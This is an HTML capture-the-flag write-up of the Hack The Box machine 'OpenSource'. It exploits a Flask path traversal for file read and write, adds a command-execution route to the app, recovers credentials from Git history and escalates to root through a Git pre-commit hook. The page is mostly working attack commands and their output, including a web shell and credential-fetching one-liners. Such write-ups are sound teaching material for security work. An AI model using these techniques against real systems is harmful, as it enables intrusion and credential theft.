@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>OpenSource | Hack The Box Writeup</title>
+  <meta name="description"
+    content="OpenSource HTB walkthrough covering Flask source review, path traversal, arbitrary file read and write, Docker, Gitea, credential exposure, SSH, and Git hook privilege escalation.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css?v=20260512-toc-indicator" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <article class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups">Back to Writeups</a>
+          </div>
+
+          <h1>OpenSource</h1>
+          <div class="writeup-platform detail"><i class="bi bi-terminal" aria-hidden="true"></i><span>Hack The Box</span></div>
+          <div class="tag-list">
+            <span class="tag">Red Team</span>
+            <span class="tag">Easy</span>
+            <span class="tag">Linux</span>
+            <span class="tag">Web Exploitation</span>
+            <span class="tag">Source Code Review</span>
+            <span class="tag">Path Traversal</span>
+            <span class="tag">Docker</span>
+            <span class="tag">Git</span>
+            <span class="tag">Credential Exposure</span>
+            <span class="tag">Lateral Movement</span>
+            <span class="tag">Privilege Escalation</span>
+            <span class="tag">Backup Abuse</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            OpenSource is an easy Linux machine from Hack The Box. My assessment connected weaknesses in a Flask file-sharing
+            application, exposed Git history, and privileged backup automation. The main lessons were tracing how source code
+            handles untrusted files, distinguishing container access from host access, and explaining how development and
+            backup practices can expose credentials and cross privilege boundaries.
+          </p>
+          <p>
+            The complete path was: source disclosure, unsafe path handling, arbitrary file read and write, code execution
+            inside a Docker container, discovery of an internal Gitea instance, recovery of a developer SSH key, and abuse of
+            a root-owned Git backup process on the host.
+          </p>
+
+          <h2>1. Reconnaissance</h2>
+          <p>I started with a full TCP scan to identify the exposed attack surface.</p>
+          <pre><code class="language-bash">nmap -p- --min-rate 5000 -T4 -Pn 10.129.227.140</code></pre>
+          <p>The scan returned SSH on port 22, HTTP on port 80, and a filtered service on port 3000.</p>
+          <pre><code class="language-text">Nmap scan report for 10.129.227.140
+Host is up (0.0081s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp</code></pre>
+          <p>I then fingerprinted the two externally reachable services.</p>
+          <pre><code class="language-bash">nmap -sC -sV -p22,80 -Pn 10.129.227.140</code></pre>
+          <pre><code class="language-text">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+80/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.10.3)
+|_http-title: upcloud - Upload files for Free!
+|_http-server-header: Werkzeug/2.1.2 Python/3.10.3</code></pre>
+          <p>
+            Port 80 was running Werkzeug 2.1.2 with Python 3.10.3 and served an application named
+            <code>upcloud</code>. Because this looked like a custom Flask application, I prioritized the web service over SSH.
+          </p>
+
+          <h2>2. Downloading the Source</h2>
+          <p>The home page exposed an upload route and advertised the project as open source.</p>
+          <pre><code class="language-bash">curl -i http://10.129.227.140/</code></pre>
+          <p>The <code>/download</code> endpoint returned a ZIP archive containing the application source.</p>
+          <pre><code class="language-bash">curl -I http://10.129.227.140/download</code></pre>
+          <pre><code class="language-text">HTTP/1.1 200 OK
+Content-Disposition: inline; filename=source.zip
+Content-Type: application/zip</code></pre>
+          <pre><code class="language-bash">wget http://10.129.227.140/download -O source.zip</code></pre>
+          <p>I listed the archive before extracting it to understand its structure.</p>
+          <pre><code class="language-bash">zipinfo -1 source.zip | head -80</code></pre>
+          <pre><code class="language-text">app/app/views.py
+app/app/utils.py
+app/app/configuration.py
+app/run.py
+app/.vscode/
+Dockerfile
+.git/</code></pre>
+          <p>
+            The archive included the Flask code, Docker configuration, development files, and the complete
+            <code>.git</code> directory. The repository history would become important later in the assessment.
+          </p>
+
+          <h2>3. Reviewing the Flask Code</h2>
+          <p>I inspected the application routes and traced how user-controlled filenames reached filesystem operations.</p>
+          <pre><code class="language-bash">unzip -p source.zip app/app/views.py</code></pre>
+          <p>Both upload and download functionality relied on the same filename helper:</p>
+          <pre><code class="language-python">f = request.files['file']
+file_name = get_file_name(f.filename)
+file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+f.save(file_path)</code></pre>
+          <pre><code class="language-python">path = get_file_name(path)
+return send_file(os.path.join(os.getcwd(), "public", "uploads", path))</code></pre>
+          <p>I opened the helper implementation next.</p>
+          <pre><code class="language-bash">unzip -p source.zip app/app/utils.py</code></pre>
+          <pre><code class="language-python">def get_file_name(unsafe_filename):
+    return recursive_replace(unsafe_filename, "../", "")</code></pre>
+          <p>
+            This function removed a literal <code>../</code> sequence but did not normalize the final path or verify that it
+            remained inside the upload directory. That incomplete validation created the main web vulnerability.
+          </p>
+
+          <h2>4. Arbitrary File Read</h2>
+          <p>
+            A path such as <code>..//etc/passwd</code> becomes <code>/etc/passwd</code> after the sanitizer removes the first
+            <code>../</code>. Since an absolute second path causes <code>os.path.join()</code> to discard the previous path,
+            the application reads outside its intended directory.
+          </p>
+          <pre><code class="language-bash">curl --path-as-is 'http://10.129.227.140/uploads/..//etc/passwd'</code></pre>
+          <pre><code class="language-text">root:x:0:0:root:/root:/bin/ash
+...
+nobody:x:65534:65534:nobody:/:/sbin/nologin</code></pre>
+          <p>
+            The response contained <code>/etc/passwd</code>, confirming arbitrary file read. The
+            <code>--path-as-is</code> option was necessary because otherwise the client could normalize the traversal before
+            sending it to Flask.
+          </p>
+
+          <h2>5. Debugger Investigation</h2>
+          <p>I requested a nonexistent file and received a Werkzeug debugger response instead of a generic server error.</p>
+          <pre><code class="language-bash">curl -i --path-as-is 'http://10.129.227.140/uploads/..//this-file-does-not-exist'</code></pre>
+          <pre><code class="language-text">Werkzeug Debugger
+EVALEX = true
+Console Locked</code></pre>
+          <p>I used the file-read primitive to inspect one of the values used by the debugger environment.</p>
+          <pre><code class="language-bash">curl --path-as-is 'http://10.129.227.140/uploads/..//sys/class/net/eth0/address'</code></pre>
+          <pre><code class="language-text">02:42:ac:11:00:03</code></pre>
+          <p>
+            Some virtual files under <code>/proc</code> did not behave reliably through Flask's file response. Rather than
+            forcing the debugger route, I returned to the upload handler and tested whether the same path issue allowed writes.
+          </p>
+
+          <h2>6. Arbitrary File Write</h2>
+          <p>I first used a harmless marker file to confirm that an absolute upload filename escaped the upload directory.</p>
+          <pre><code class="language-bash">echo 'HTB_WRITE_TEST' | curl -s \
+  -F 'file=@-;filename=/tmp/htb_test.txt' \
+  http://10.129.227.140/upcloud</code></pre>
+          <p>I then read the marker through the traversal issue.</p>
+          <pre><code class="language-bash">curl --path-as-is 'http://10.129.227.140/uploads/..//tmp/htb_test.txt'</code></pre>
+          <pre><code class="language-text">HTB_WRITE_TEST</code></pre>
+          <p>
+            At this point the application provided both arbitrary file read and arbitrary file write. Because the Flask source
+            path was known, the write primitive could affect executable application code.
+          </p>
+
+          <h2>7. Flask RCE</h2>
+          <p>
+            I retrieved the live <code>views.py</code>, appended a small route that executed a supplied command, and uploaded the
+            modified file back to <code>/app/app/views.py</code>. Using <code>curl --path-as-is</code> was important here because
+            other HTTP clients normalized the crafted path.
+          </p>
+          <pre><code class="language-python">@app.route('/cmd')
+def cmd():
+    return os.popen(request.args.get('c', 'id')).read()</code></pre>
+          <p>I verified that the route was present in the live source:</p>
+          <pre><code class="language-bash">curl -s --path-as-is \
+  'http://10.129.227.140/uploads/..//app/app/views.py' | tail</code></pre>
+          <p>After Flask reloaded, requesting the new route executed the command.</p>
+          <pre><code class="language-bash">curl 'http://10.129.227.140/cmd?c=id'</code></pre>
+          <pre><code class="language-text">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+          <figure>
+            <img src="../assets/img/OpenSource/01-container-rce.png" alt="Command execution through the injected Flask route returning a root identity inside the container">
+            <figcaption>The injected Flask route confirmed command execution as root inside the application container.</figcaption>
+          </figure>
+
+          <h2>8. Container Enumeration</h2>
+          <p>
+            A root identity did not necessarily mean control of the host. Inspecting the process cgroup showed that the web
+            application was running inside Docker.
+          </p>
+          <pre><code class="language-bash">curl -G --data-urlencode 'c=cat /proc/1/cgroup' http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">12:cpuset:/docker/fb2f7ef...
+11:cpu,cpuacct:/docker/fb2f7ef...
+...</code></pre>
+          <p>I inspected the container routing table to identify its gateway and internal network.</p>
+          <pre><code class="language-bash">curl -G --data-urlencode 'c=ip route' http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">default via 172.17.0.1 dev eth0
+172.17.0.0/16 dev eth0 scope link src 172.17.0.3</code></pre>
+          <p>
+            This distinction changed the next objective from local privilege escalation to reaching the underlying host from
+            the container network.
+          </p>
+
+          <h2>9. Internal Gitea Discovery</h2>
+          <p>
+            Port 3000 had been filtered externally, so I tested it from the container against the Docker gateway. The
+            connection succeeded, confirming that the service was reachable internally.
+          </p>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import socket; s=socket.socket(); s.settimeout(3); print(s.connect_ex(('172.17.0.1',3000)))\"" \
+  http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">0</code></pre>
+          <p>
+            Requesting the service identified Gitea 1.16.6 and references to <code>opensource.htb:3000</code>. Anonymous
+            repository and user searches did not return useful results, so credentials were required.
+          </p>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import urllib.request; print(urllib.request.urlopen('http://172.17.0.1:3000/').read().decode())\"" \
+  http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">Gitea: Git with a cup of tea
+Gitea 1.16.6
+Host: opensource.htb:3000</code></pre>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import urllib.request; print(urllib.request.urlopen('http://172.17.0.1:3000/api/v1/repos/search?limit=50').read().decode())\"" \
+  http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">GET /api/v1/repos/search?limit=50
+{"ok":true,"data":[]}</code></pre>
+
+          <h2>10. Credentials in Git History</h2>
+          <p>
+            The downloaded archive contained a complete Git repository. I searched every branch and commit for changes to the
+            development configuration.
+          </p>
+          <pre><code class="language-bash">git log -p --all -- app/.vscode</code></pre>
+          <pre><code class="language-text">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+Author: gituser &lt;gituser@local&gt;
+
+    added gitignore
+
+diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
+deleted file mode 100644
+--- a/app/.vscode/settings.json
++++ /dev/null
+@@ -1,5 +0,0 @@
+-{
+-  "python.pythonPath": "/home/dev01/.virtualenvs/.../bin/python",
+-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+-  "http.proxyStrictSSL": false
+-}</code></pre>
+          <p>
+            A deleted VS Code settings file contained a proxy URL with credentials for <code>dev01</code>. Although the file was
+            absent from the current tree, its previous contents remained recoverable from the repository history.
+          </p>
+          <figure>
+            <img src="../assets/img/OpenSource/02-git-history-credential-leak.png" alt="Git history exposing developer credentials in a deleted VS Code configuration">
+            <figcaption>A deleted development configuration remained accessible through Git history and exposed credentials.</figcaption>
+          </figure>
+          <p>
+            Password authentication was disabled for SSH, but the credentials worked against the internal Gitea API. The
+            authenticated account also had access to private repositories.
+          </p>
+          <pre><code class="language-bash">ssh dev01@10.129.227.140</code></pre>
+          <pre><code class="language-text">dev01@10.129.227.140: Permission denied (publickey).</code></pre>
+          <p>I reused the recovered credentials against the internal Gitea API.</p>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import urllib.request,base64; r=urllib.request.Request('http://172.17.0.1:3000/api/v1/user'); r.add_header('Authorization','Basic '+base64.b64encode(b'dev01:Soulless_Developer#2022').decode()); print(urllib.request.urlopen(r).read().decode())\"" \
+  http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">Authenticated Gitea response:
+login: dev01
+email: dev01@opensource.htb
+is_admin: true</code></pre>
+
+          <h2>11. Gitea Home Backup</h2>
+          <p>
+            Authenticated repository enumeration revealed <code>dev01/home-backup</code>, described as a backup of the user's
+            home directory. The repository included the contents of <code>.ssh</code>:
+          </p>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import urllib.request,base64; r=urllib.request.Request('http://172.17.0.1:3000/api/v1/user/repos'); r.add_header('Authorization','Basic '+base64.b64encode(b'dev01:Soulless_Developer#2022').decode()); print(urllib.request.urlopen(r).read().decode())\"" \
+  http://10.129.227.140/cmd</code></pre>
+          <pre><code class="language-text">authorized_keys
+id_rsa
+id_rsa.pub</code></pre>
+          <pre><code class="language-text">Repository: dev01/home-backup
+Description: A backup of my home directory
+Visibility: private
+Permissions: admin, push, pull</code></pre>
+          <p>
+            The private key corresponded to the key in <code>authorized_keys</code>, providing the authentication material needed
+            for host access.
+          </p>
+          <figure>
+            <img src="../assets/img/OpenSource/03-gitea-private-key-exposure.png" alt="Private SSH key exposed inside the authenticated Gitea home-backup repository">
+            <figcaption>The private home-backup repository exposed the SSH key used by dev01.</figcaption>
+          </figure>
+          <p>I retrieved the private key from the repository, saved it locally, and restricted its permissions before using it.</p>
+          <pre><code class="language-bash">curl -G --data-urlencode \
+  "c=python -c \"import urllib.request,base64; r=urllib.request.Request('http://172.17.0.1:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa'); r.add_header('Authorization','Basic '+base64.b64encode(b'dev01:Soulless_Developer#2022').decode()); print(urllib.request.urlopen(r).read().decode())\"" \
+  http://10.129.227.140/cmd &gt; /tmp/dev01_id_rsa</code></pre>
+          <pre><code class="language-bash">chmod 600 /tmp/dev01_id_rsa</code></pre>
+          <pre><code class="language-text">100  3244  100  3244  0  0  24613  0 --:--:-- --:--:-- --:--:-- 24763</code></pre>
+
+          <h2>12. SSH Host Foothold</h2>
+          <p>The recovered private key provided an SSH session as <code>dev01</code> on the actual Ubuntu host.</p>
+          <pre><code class="language-bash">ssh -i /tmp/dev01_id_rsa dev01@10.129.227.140</code></pre>
+          <pre><code class="language-text">Welcome to Ubuntu 18.04.6 LTS
+Last login: Mon May 16 13:31:41 2022
+dev01@opensource:~$</code></pre>
+          <figure>
+            <img src="../assets/img/OpenSource/04-ssh-host-session.png" alt="Successful SSH session as dev01 on the OpenSource host">
+            <figcaption>The recovered key established a host-level session as dev01, outside the Docker container.</figcaption>
+          </figure>
+          <p>The user flag was available in the home directory.</p>
+          <pre><code class="language-bash">cat /home/dev01/user.txt</code></pre>
+          <pre><code class="language-text">7123e816973b8fb46a1214eda179174d</code></pre>
+
+          <h2>13. Root-Owned Git Backup</h2>
+          <p>
+            The usual checks did not reveal a sudo or custom cron path. However, <code>/home/dev01</code> was itself a Git
+            repository, and its history contained a fresh automated backup commit.
+          </p>
+          <pre><code class="language-bash">sudo -l</code></pre>
+          <pre><code class="language-text">[sudo] password for dev01:
+Sorry, user dev01 may not run sudo on opensource.</code></pre>
+          <pre><code class="language-bash">git log --oneline --decorate -10</code></pre>
+          <pre><code class="language-text">4428a8e (HEAD -&gt; main) Backup for 2026-09-05
+dc049c6 Backup for 2022-05-16
+d4c5300 (origin/main) Backup for 2022-05-16</code></pre>
+          <p>
+            Git author metadata only showed <code>gituser</code>, which is a configurable label and does not prove which Linux
+            account executed Git. I therefore checked the ownership of the newly created Git object.
+          </p>
+          <pre><code class="language-bash">ls -l .git/objects/44/28a8e*</code></pre>
+          <pre><code class="language-text">-r--r--r-- 1 root root 158 Sep 5 06:58 .git/objects/44/28a8ea3b...</code></pre>
+          <p>
+            Root ownership proved that a privileged process was performing Git operations inside a repository controlled by
+            <code>dev01</code>. The repository's <code>.git/hooks</code> directory was also writable by the user.
+          </p>
+
+          <h2>14. Git Hook Privilege Escalation</h2>
+          <p>
+            Git executes a <code>pre-commit</code> hook whenever a commit is created. Because root's backup process committed in
+            a user-controlled repository, a writable hook crossed the privilege boundary.
+          </p>
+          <pre><code class="language-bash">git config --get core.hooksPath</code></pre>
+          <pre><code class="language-bash">ls -ld .git/hooks</code></pre>
+          <pre><code class="language-text">drwxrwxr-x 2 dev01 dev01 4096 May 4 2022 .git/hooks</code></pre>
+          <p>I created an executable hook that copied Bash and assigned it the SUID permission when the next backup ran.</p>
+          <pre><code class="language-bash">cat &gt; .git/hooks/pre-commit &lt;&lt;'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF</code></pre>
+          <pre><code class="language-bash">chmod +x .git/hooks/pre-commit</code></pre>
+          <pre><code class="language-bash">touch ~/backup-trigger</code></pre>
+          <p>After the automated commit, the new binary was owned by root and had the SUID bit set.</p>
+          <pre><code class="language-bash">ls -l /tmp/rootbash</code></pre>
+          <pre><code class="language-text">-rwsr-xr-x 1 root root ... /tmp/rootbash</code></pre>
+          <p>Running Bash with <code>-p</code> preserved the privileged effective UID.</p>
+          <pre><code class="language-bash">/tmp/rootbash -p</code></pre>
+          <pre><code class="language-bash">id</code></pre>
+          <pre><code class="language-text">uid=1000(dev01) euid=0(root)</code></pre>
+          <figure>
+            <img src="../assets/img/OpenSource/05-git-hook-root-access.png" alt="Git pre-commit hook execution leading to an effective root identity">
+            <figcaption>The root-owned backup executed the writable hook, resulting in an effective UID of zero.</figcaption>
+          </figure>
+          <p>With effective root privileges, the final flag could be read.</p>
+          <pre><code class="language-bash">cat /root/root.txt</code></pre>
+          <pre><code class="language-text">440ac977e8acbf9322282f03779c1ea7</code></pre>
+
+          <h2>Attack Chain</h2>
+          <ol>
+            <li>Enumerated SSH, HTTP, and the externally filtered port 3000.</li>
+            <li>Downloaded the Flask source archive from the web application.</li>
+            <li>Identified incomplete filename sanitization in the upload and download handlers.</li>
+            <li>Used the path handling flaw for arbitrary file read and arbitrary file write.</li>
+            <li>Modified the Flask application and obtained command execution as root inside Docker.</li>
+            <li>Reached the host-only Gitea service through the Docker gateway.</li>
+            <li>Recovered developer credentials from a deleted file in Git history.</li>
+            <li>Authenticated to a private home-backup repository and recovered the dev01 SSH key.</li>
+            <li>Established an SSH foothold as dev01 on the host.</li>
+            <li>Identified a root-owned automated Git backup in the user-controlled repository.</li>
+            <li>Used a writable pre-commit hook to obtain an effective root identity.</li>
+          </ol>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li>Source code disclosure can expose both application weaknesses and historical development data.</li>
+            <li>Path validation must use canonical paths and enforce that the final destination remains inside its intended directory.</li>
+            <li>Arbitrary file write becomes much more serious when an application can overwrite executable code.</li>
+            <li>Root inside a container is not equivalent to root on the underlying host.</li>
+            <li>Services filtered externally may still be reachable from an internal container network.</li>
+            <li>Deleting a secret from the current Git tree does not remove it from repository history.</li>
+            <li>Home-directory backups should never expose private authentication material.</li>
+            <li>Privileged automation must not execute configuration or hooks controlled by a less-privileged user.</li>
+          </ul>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </article>
+      </div>
+    </section>
+  </main>
+  <script src="../assets/js/main.js?v=20260514-writeup-toc-bottom" defer></script>
+</body>
+
+</html>
